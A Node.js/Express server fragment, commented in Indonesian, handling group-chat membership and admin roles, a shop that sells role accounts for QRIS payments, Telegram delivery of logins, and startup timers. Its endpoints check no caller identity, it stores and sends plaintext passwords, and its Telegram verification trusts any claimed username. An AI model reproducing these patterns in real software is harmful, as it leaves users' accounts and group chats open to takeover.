app.post("/api/groups/:id/members", express.json(), (req, res) => {
  try {
    const { usernames } = req.body;
    if (!Array.isArray(usernames) || usernames.length === 0) {
      return res.json({ success: false, message: "Pilih minimal 1 user" });
    }

    const rooms = loadChatRooms();
    const idx = rooms.findIndex(r => r.id === req.params.id && r.type === "group");
    if (idx === -1) return res.json({ success: false, message: "Not found" });

    const room = rooms[idx];

    // ✅ LANGSUNG TAMBAH (CULIK) — tanpa approval
    const newMembers = usernames.filter(u => !room.members.includes(u));
    if (newMembers.length === 0) {
      return res.json({ success: true, added: [], message: "Semua user sudah jadi member" });
    }

    room.members.push(...newMembers);
    rooms[idx] = room;
    saveChatRooms(rooms);

    // System message
    const messages = loadChatMessages();
    messages.push({
      id: `msg_${Date.now()}_sys`,
      roomId: room.id,
      senderUsername: "system",
      senderRole: "system",
      type: "system",
      text: `${newMembers.join(", ")} ditambahkan ke grup`,
      createdAt: new Date().toISOString(),
      isDeleted: false,
    });
    saveChatMessages(messages);

    // Notif ke semua member + ke new member
    broadcastGroupUpdate(room.id, "members_added", {
      members: newMembers,
      group: getGroupDetail(room),
    });

    logSuccess(`[GROUP] Add ${newMembers.length} member ke ${room.name}: ${newMembers.join(", ")}`);
    return res.json({ success: true, added: newMembers, group: getGroupDetail(room) });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

// ─── DELETE /api/groups/:id/members/:username (KICK/LEAVE) ─
app.delete("/api/groups/:id/members/:username", (req, res) => {
  try {
    const { username } = req.params;
    const rooms = loadChatRooms();
    const idx = rooms.findIndex(r => r.id === req.params.id && r.type === "group");
    if (idx === -1) return res.json({ success: false, message: "Not found" });

    const room = rooms[idx];

    // Owner tidak bisa keluar (harus hapus grup atau transfer)
    if (room.ownerUsername === username) {
      return res.json({
        success: false,
        message: "Owner tidak bisa keluar. Hapus grup atau transfer ownership dulu.",
      });
    }

    room.members = room.members.filter(m => m !== username);
    room.admins = room.admins.filter(a => a !== username);
    rooms[idx] = room;
    saveChatRooms(rooms);

    // System message
    const messages = loadChatMessages();
    messages.push({
      id: `msg_${Date.now()}_sys`,
      roomId: room.id,
      senderUsername: "system",
      senderRole: "system",
      type: "system",
      text: `${username} keluar dari grup`,
      createdAt: new Date().toISOString(),
      isDeleted: false,
    });
    saveChatMessages(messages);

    broadcastGroupUpdate(room.id, "member_removed", {
      username,
      group: getGroupDetail(room),
    });

    logSuccess(`[GROUP] ${username} keluar dari ${room.name}`);
    return res.json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

// ─── POST /api/groups/:id/admins (PROMOTE) ──────────────
app.post("/api/groups/:id/admins", express.json(), (req, res) => {
  try {
    const { username } = req.body;
    if (!username) return res.json({ success: false, message: "username wajib" });

    const rooms = loadChatRooms();
    const idx = rooms.findIndex(r => r.id === req.params.id && r.type === "group");
    if (idx === -1) return res.json({ success: false, message: "Not found" });

    const room = rooms[idx];
    if (!room.members.includes(username)) {
      return res.json({ success: false, message: "User bukan member grup" });
    }

    if (!room.admins.includes(username)) {
      room.admins.push(username);
      rooms[idx] = room;
      saveChatRooms(rooms);
      broadcastGroupUpdate(room.id, "admin_promoted", { username });
      logSuccess(`[GROUP] ${username} jadi admin di ${room.name}`);
    }

    return res.json({ success: true, admins: room.admins });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

// ─── DELETE /api/groups/:id/admins/:username (DEMOTE) ───
app.delete("/api/groups/:id/admins/:username", (req, res) => {
  try {
    const { username } = req.params;
    const rooms = loadChatRooms();
    const idx = rooms.findIndex(r => r.id === req.params.id && r.type === "group");
    if (idx === -1) return res.json({ success: false, message: "Not found" });

    const room = rooms[idx];
    if (room.ownerUsername === username) {
      return res.json({ success: false, message: "Owner tidak bisa di-demote" });
    }

    room.admins = room.admins.filter(a => a !== username);
    rooms[idx] = room;
    saveChatRooms(rooms);

    broadcastGroupUpdate(room.id, "admin_demoted", { username });
    logSuccess(`[GROUP] ${username} turun dari admin di ${room.name}`);
    return res.json({ success: true, admins: room.admins });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

// ═══════════════════════════════════════════════════════════
// [+] END PROFILE + FOLLOW + GROUP
// ═══════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════
// [+] SHOP AUTO-DELIVERY — QRIS + ACC + Kirim Data ke Pembeli
// ═══════════════════════════════════════════════════════════════

// ─── Config ──────────────────────────────────────────────────
const SHOP_QRIS_URL = "https://files.catbox.moe/vkia2j.jpg"; // ⚠️ GANTI QRIS ASLI
const SHOP_ORDERS_FILE = path.join(__dirname, "shop_orders.json");
const SHOP_TG_FILE = path.join(__dirname, "shop_telegram_links.json");
const SHOP_PROOF_DIR = path.join(__dirname, "uploads", "shop_proofs");

if (!fs.existsSync(SHOP_ORDERS_FILE)) fs.writeFileSync(SHOP_ORDERS_FILE, "{}");
if (!fs.existsSync(SHOP_TG_FILE)) fs.writeFileSync(SHOP_TG_FILE, "{}");
if (!fs.existsSync(SHOP_PROOF_DIR)) fs.mkdirSync(SHOP_PROOF_DIR, { recursive: true });

function loadShopOrders() {
  try { return JSON.parse(fs.readFileSync(SHOP_ORDERS_FILE, "utf8") || "{}"); } catch { return {}; }
}
function saveShopOrders(d) { fs.writeFileSync(SHOP_ORDERS_FILE, JSON.stringify(d, null, 2)); }

function loadShopTg() {
  try { return JSON.parse(fs.readFileSync(SHOP_TG_FILE, "utf8") || "{}"); } catch { return {}; }
}
function saveShopTg(d) { fs.writeFileSync(SHOP_TG_FILE, JSON.stringify(d, null, 2)); }

function findShopChatId(username) {
  const uname = String(username).replaceAll('@', '').toLowerCase();
  const links = loadShopTg();
  for (const [chatId, data] of Object.entries(links)) {
    if (data.username && data.username.toLowerCase() === uname) return chatId;
  }
  return null;
}

function getShopAdminIds() {
  const cfg = loadTelegramConfig();
  return [...new Set([
    ...(cfg.godUser || []),
    ...(cfg.developerUser || []),
    ...(cfg.ownerUser || []),
  ])].map(String);
}

// ─── Bot: /start verify_USERNAME (deep link) ─────────────────
bot.onText(/^\/start\s+(.+)$/, async (msg, match) => {
  const chatId = String(msg.chat.id);
  const payload = match[1].trim();
  const fromUsername = msg.from?.username || '';

  const tg = loadShopTg();

  if (payload.startsWith('verify_')) {
    const linked = payload.substring(7).toLowerCase();
    tg[chatId] = { username: linked, verifiedAt: Date.now(), via: 'deep_link' };
    saveShopTg(tg);

    const orders = loadShopOrders();
    const pending = Object.values(orders).find(o => o.telegram === linked && o.status === 'pending');

    return bot.sendMessage(chatId,
      `👋 *Verifikasi Berhasil!*\n\n` +
      `Username: @${linked}\n` +
      `Chat ID: \`${chatId}\`\n\n` +
      (pending ? `📦 Order pending: \`${pending.orderId}\`\n\n` : '') +
      `Data akun akan dikirim ke chat ini setelah di-ACC.\n\n` +
      `Kembali ke aplikasi & klik "Cek Verifikasi".`,
      { parse_mode: 'Markdown' }
    );
  }

  if (fromUsername) {
    tg[chatId] = { username: fromUsername.toLowerCase(), verifiedAt: Date.now(), via: 'username' };
    saveShopTg(tg);
    return bot.sendMessage(chatId,
      `👋 Halo @${fromUsername}!\n\n` +
      `Chat ID kamu terdaftar: \`${chatId}\`\n` +
      `Data akun akan dikirim ke sini setelah pembelian di-ACC.`,
      { parse_mode: 'Markdown' }
    );
  }

  return bot.sendMessage(chatId, '👋 Silakan mulai dari aplikasi & klik "Buka Bot & Kirim /start".');
});

// ─── HTTP: verifikasi telegram ───────────────────────────────
app.get('/api/shop/verify-telegram/:username', (req, res) => {
  const uname = req.params.username.replaceAll('@', '').toLowerCase();
  const chatId = findShopChatId(uname);
  res.json({ verified: !!chatId, chatId: chatId || null });
});

// ─── HTTP: create order ──────────────────────────────────────
app.post('/api/shop/create-order', express.json(), (req, res) => {
  try {
    const { role, price, username, password, telegram } = req.body;
    if (!role || !price || !username || !password || !telegram) {
      return res.status(400).json({ error: 'Missing fields' });
    }

    const db = loadDatabase();
    if (db.find(u => u.username === username)) {
      return res.status(409).json({ error: 'Username sudah dipakai' });
    }

    const uname = String(telegram).replaceAll('@', '').toLowerCase();
    const chatId = findShopChatId(uname);
    if (!chatId) {
      return res.status(403).json({ error: 'Bot belum terverifikasi. Buka bot & kirim /start dulu.' });
    }

    const orderId = 'ORD-' + Date.now() + '-' + Math.random().toString(36).slice(2, 6).toUpperCase();
    const orders = loadShopOrders();
    orders[orderId] = {
      orderId,
      role,
      price: Number(price),
      username,
      password,
      telegram: uname,
      buyerChatId: chatId,
      status: 'pending',
      deliveryStatus: 'pending',
      proofUrl: null,
      createdAt: Date.now(),
    };
    saveShopOrders(orders);

    res.json({ orderId, qrisUrl: SHOP_QRIS_URL });
  } catch (err) {
    logError('[SHOP] create-order:', err.message);
    res.status(500).json({ error: 'Internal error' });
  }
});

// ─── HTTP: upload proof ──────────────────────────────────────
const shopProofStorage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, SHOP_PROOF_DIR),
  filename: (req, file, cb) =>
    cb(null, `${Date.now()}_${Math.random().toString(36).slice(2, 8)}${path.extname(file.originalname)}`),
});
const uploadShopProof = multer({ storage: shopProofStorage });

app.post('/api/shop/upload-proof', uploadShopProof.single('proof'), async (req, res) => {
  try {
    const { orderId } = req.body;
    const orders = loadShopOrders();
    const o = orders[orderId];
    if (!o) return res.status(404).json({ error: 'Order not found' });
    if (o.status !== 'pending') return res.json({ success: true, note: 'already ' + o.status });
    if (!req.file) return res.status(400).json({ error: 'No file' });

    o.proofUrl = `${HOST}/uploads/shop_proofs/${req.file.filename}`;
    o.proofUploadedAt = Date.now();
    saveShopOrders(orders);

    const caption =
      `🛒 *PEMBELIAN BARU*\n\n` +
      `Order: \`${orderId}\`\n` +
      `Role: *${o.role.toUpperCase()}*\n` +
      `Harga: Rp ${o.price.toLocaleString('id-ID')}\n` +
      `Username Akun: \`${o.username}\`\n` +
      `Password: \`${o.password}\`\n` +
      `Telegram Pembeli: @${o.telegram}\n` +
      `Chat ID: \`${o.buyerChatId}\`\n\n` +
      `✅ ACC: \`/acc_${orderId}\`\n` +
      `❌ TOLAK: \`/reject_${orderId} alasan\``;

    const admins = getShopAdminIds();
    for (const id of admins) {
      try {
        await bot.sendMessage(id, caption, { parse_mode: 'Markdown' });
        await bot.sendPhoto(id, o.proofUrl).catch(async () => {
          await bot.sendMessage(id, `⚠️ Bukti (foto gagal, buka link): ${o.proofUrl}`);
        });
      } catch (e) {
        logError(`[SHOP] Notif admin ${id}: ${e.message}`);
      }
    }

    res.json({ success: true });
  } catch (err) {
    logError('[SHOP] upload-proof:', err.message);
    res.status(500).json({ error: 'Internal error' });
  }
});

app.use('/uploads/shop_proofs', express.static(SHOP_PROOF_DIR));

// ─── HTTP: order status (polling app) ───────────────────────
app.get('/api/shop/order-status/:orderId', (req, res) => {
  const orders = loadShopOrders();
  const o = orders[req.params.orderId];
  if (!o) return res.status(404).json({ error: 'Not found' });

  res.json({
    status: o.status,
    deliveryStatus: o.deliveryStatus,
    reason: o.rejectionReason,
    role: o.role,
    username: o.status === 'accepted' ? o.username : null,
    password: o.status === 'accepted' ? o.password : null,
  });
});

// ─── Delivery: kirim data akun ke pembeli ───────────────────
async function deliverShopAccount(orderId) {
  const orders = loadShopOrders();
  const o = orders[orderId];
  if (!o || o.status !== 'accepted') return false;

  const msg =
    `🎉 *PEMBELIAN DI-ACC!*\n\n` +
    `Order: \`${orderId}\`\n` +
    `Role: *${o.role.toUpperCase()}*\n\n` +
    `👤 Username: \`${o.username}\`\n` +
    `🔑 Password: \`${o.password}\`\n\n` +
    `Silakan login di aplikasi.\nTerima kasih!`;

  o.deliveryStatus = 'sending';
  saveShopOrders(orders);

  // 1) Via chat_id (paling andal)
  if (o.buyerChatId) {
    try {
      await bot.sendMessage(o.buyerChatId, msg, { parse_mode: 'Markdown' });
      o.deliveryStatus = 'sent';
      o.deliveredAt = Date.now();
      saveShopOrders(orders);
      return true;
    } catch (e) {
      logError(`[SHOP] Delivery ke chatId gagal: ${e.message}`);
    }
  }

  // 2) Fallback cari chat_id dari username
  const cid = findShopChatId(o.telegram);
  if (cid) {
    try {
      await bot.sendMessage(cid, msg, { parse_mode: 'Markdown' });
      o.buyerChatId = cid;
      o.deliveryStatus = 'sent';
      o.deliveredAt = Date.now();
      saveShopOrders(orders);
      return true;
    } catch (e) {
      logError(`[SHOP] Fallback delivery gagal: ${e.message}`);
    }
  }

  // 3) Gagal total → kasih tahu admin
  o.deliveryStatus = 'failed';
  saveShopOrders(orders);

  const admins = getShopAdminIds();
  for (const id of admins) {
    try {
      await bot.sendMessage(id,
        `⚠️ *GAGAL KIRIM KE PEMBELI*\n\n` +
        `Order: \`${orderId}\`\n` +
        `Username: \`${o.username}\`\n` +
        `Password: \`${o.password}\`\n` +
        `Telegram: @${o.telegram}\n\n` +
        `Pembeli wajib /start bot dulu, lalu ketik \`/resend_${orderId}\``,
        { parse_mode: 'Markdown' }
      );
    } catch {}
  }
  return false;
}

// ─── Bot: handle ACC ────────────────────────────────────────
async function handleAccShopOrder(orderId) {
  const orders = loadShopOrders();
  const o = orders[orderId];
  if (!o) return { ok: false, msg: 'Order tidak ditemukan' };
  if (o.status === 'rejected') return { ok: false, msg: 'Order sudah ditolak' };

  if (o.status === 'accepted') {
    if (o.deliveryStatus !== 'sent') {
      const ok = await deliverShopAccount(orderId);
      return { ok: true, msg: ok ? 'Data dikirim ulang' : 'Gagal kirim, coba /resend' };
    }
    return { ok: true, msg: 'Sudah di-ACC sebelumnya' };
  }

if (!o.proofUrl) return { ok: false, msg: 'Bukti transfer belum diupload' };

const db = loadDatabase();
const existingUser = db.find(u => u.username === o.username);

if (existingUser && existingUser.fromOrder !== orderId) {
  o.status = 'rejected';
  o.rejectionReason = 'Username sudah dipakai user lain';
  o.rejectedAt = Date.now();
  saveShopOrders(orders);
  return { ok: false, msg: 'Username bentrok, order ditolak otomatis' };
}

if (!existingUser) {
  const expired = new Date();
  expired.setFullYear(expired.getFullYear() + 10);
  db.push({
    username: o.username,
    password: o.password,
    role: o.role.toLowerCase(),
    expiredDate: expired.toISOString().split('T')[0],
    isBanned: false,
    createdBy: 'SHOP_AUTO',
    creatorRole: 'system',
    creatorName: 'Auto Shop',
    createdAt: new Date().toISOString(),
    fromOrder: orderId,
  });
  saveDatabase(db);
}

  o.status = 'accepted';
  o.accAt = Date.now();
  saveShopOrders(orders);

  saveUserLog(o.username, "shop", "Akun Dibeli", `Order: ${orderId} | Role: ${o.role}`);

  const delivered = await deliverShopAccount(orderId);

  return {
    ok: true,
    msg: delivered
      ? `✅ Di-ACC. Data akun terkirim ke @${o.telegram}`
      : `⚠️ Akun dibuat, TAPI gagal kirim. Pembeli harus /start bot dulu, lalu ketik /resend_${orderId}`,
  };
}

// ─── Bot: commands ──────────────────────────────────────────
bot.onText(/^\/acc_(\S+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  if (!getShopAdminIds().includes(userId)) {
    return bot.sendMessage(chatId, '⛔ Hanya Owner/Developer/God.');
  }
  const r = await handleAccShopOrder(match[1]);
  bot.sendMessage(chatId, r.ok ? r.msg : `❌ ${r.msg}`, { parse_mode: 'Markdown' });
});

bot.onText(/^\/reject_(\S+)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  if (!getShopAdminIds().includes(userId)) {
    return bot.sendMessage(chatId, '⛔ Hanya Owner/Developer/God.');
  }

  const orderId = match[1];
  const reason = match[2] || 'Tidak ada alasan';
  const orders = loadShopOrders();
  const o = orders[orderId];
  if (!o) return bot.sendMessage(chatId, '❌ Order tidak ditemukan');
  if (o.status === 'accepted') return bot.sendMessage(chatId, '❌ Sudah di-ACC');

  o.status = 'rejected';
  o.rejectionReason = reason;
  o.rejectedAt = Date.now();
  saveShopOrders(orders);

  const msgText =
    `❌ *PEMBELIAN DITOLAK*\n\n` +
    `Order: \`${orderId}\`\n` +
    `Alasan: ${reason}\n\n` +
    `Hubungi admin untuk info lanjut.`;

  let sent = false;
  if (o.buyerChatId) {
    try { await bot.sendMessage(o.buyerChatId, msgText, { parse_mode: 'Markdown' }); sent = true; } catch {}
  }
  if (!sent) {
    const cid = findShopChatId(o.telegram);
    if (cid) { try { await bot.sendMessage(cid, msgText, { parse_mode: 'Markdown' }); sent = true; } catch {} }
  }

  bot.sendMessage(chatId, sent ? '✅ Ditolak & pembeli dinotifikasi' : '✅ Ditolak (gagal notif pembeli)');
});

bot.onText(/^\/resend_(\S+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  if (!getShopAdminIds().includes(userId)) {
    return bot.sendMessage(chatId, '⛔ Hanya Owner/Developer/God.');
  }
  const ok = await deliverShopAccount(match[1]);
  bot.sendMessage(chatId, ok ? '✅ Data terkirim ulang' : '❌ Masih gagal');
});

bot.onText(/^\/statusshop_(\S+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  if (!getShopAdminIds().includes(userId)) {
    return bot.sendMessage(chatId, '⛔ Hanya Owner/Developer/God.');
  }
  const orders = loadShopOrders();
  const o = orders[match[1]];
  if (!o) return bot.sendMessage(chatId, '❌ Tidak ditemukan');

  bot.sendMessage(chatId,
    `📦 *Status Order*\n\n` +
    `ID: \`${o.orderId}\`\n` +
    `Role: ${o.role}\n` +
    `Harga: Rp ${o.price.toLocaleString('id-ID')}\n` +
    `Username: \`${o.username}\`\n` +
    `Password: \`${o.password}\`\n` +
    `Telegram: @${o.telegram}\n` +
    `Status: *${o.status}*\n` +
    `Delivery: *${o.deliveryStatus}*\n` +
    `Chat ID: \`${o.buyerChatId || '-'}\``,
    { parse_mode: 'Markdown' }
  );
});

// ─── Auto retry delivery failed (tiap 60s) ──────────────────
setInterval(async () => {
  const orders = loadShopOrders();
  const failed = Object.values(orders).filter(
    (o) => o.status === 'accepted' && o.deliveryStatus === 'failed'
  );
  for (const o of failed) {
    if (findShopChatId(o.telegram)) {
      logSuccess(`[SHOP] Retry delivery ${o.orderId}`);
      await deliverShopAccount(o.orderId);
    }
  }
}, 60 * 1000);

logSuccess("[SHOP] ✅ Shop module initialized");


// ===== Start Express Server =====
server.listen(wsPort, async () => {
  logSuccess(` Server running on ${HOST}:${wsPort}`);
  startAutoRestartTimer();
  startAutoBackupTimer();
  logSuccess(`[BACKUP] Auto-backup aktif. Interval: ${BACKUP_INTERVAL_MS / 60000} menit, Max: ${MAX_BACKUPS} backup.`);

  // ==========================================================
  // [+] NOTIFIKASI SERVER START / RESTART
  // ==========================================================
  setTimeout(async () => {
    const state = readRestartState();
    const isFirstBoot = !state.lastRestart || state.firstBoot;
    const lastRestartAgo = state.lastRestart 
      ? formatUptime(Date.now() - state.lastRestart) 
      : "N/A";

    if (isFirstBoot) {
  await notifyGroup(
    `*Status:* ONLINE\n` +
    `*Waktu:* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n` +
    `*Node:* ${process.version}\n` +
    `*Platform:* ${process.platform}\n\n` +
    `Semua sistem siap! Bot aktif & menerima perintah.`,
    'Markdown',
    {
      title: '🚀 SERVER ONLINE',
      subtitle: 'Server baru saja dimulai'
    }
  );
  logSuccess("[BOOT] Notifikasi server pertama kali dikirim.");
} else {
  await notifyGroup(
    `*Status:* ONLINE\n` +
    `*Waktu:* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n` +
    `*Restart Ke:* ${state.restartCount}\n` +
    `*Downtime:* ~${lastRestartAgo}\n` +
    `*Node:* ${process.version}\n\n` +
    `*Alasan:* ${state.lastReason || "Auto Restart"}\n` +
    `Semua sistem kembali normal!`,
    'Markdown',
    {
      title: '✅ SERVER AKTIF KEMBALI',
      subtitle: 'Restart berhasil'
    }
  );
  logSuccess("[BOOT] Notifikasi restart dikirim.");
}
  }, 8000); // Delay 8 detik biar bot & WA konek dulu

  // ==========================================================
  // [+] START SESSION & TIMERS
  // ==========================================================
  setInterval(cleanupOldSetoran, 20 * 60 * 1000);
  logSuccess("[SETORAN] Auto-cleanup aktif (tiap 20 menit)");

  startVipSessions();
  startUserSessions();

  logSuccess(`[AUTO REFRESH] Diatur setiap 20 menit sekali.`);
  setInterval(autoRefresh, 20 * 60 * 1000); // 20 menit

  logSuccess(`[AUTOCLEAN LOGS] Diatur setiap 20 menit.`);
  scheduleAutoClean();

  // ==========================================================
  // [+] HEARTBEAT - Update state tiap 30 detik
  // ==========================================================
  setInterval(() => {
    const state = readRestartState();
    state.lastHeartbeat = Date.now();
    state.uptime = Date.now() - SERVER_START_TIME;
    saveRestartState(state);
  }, 30000);
});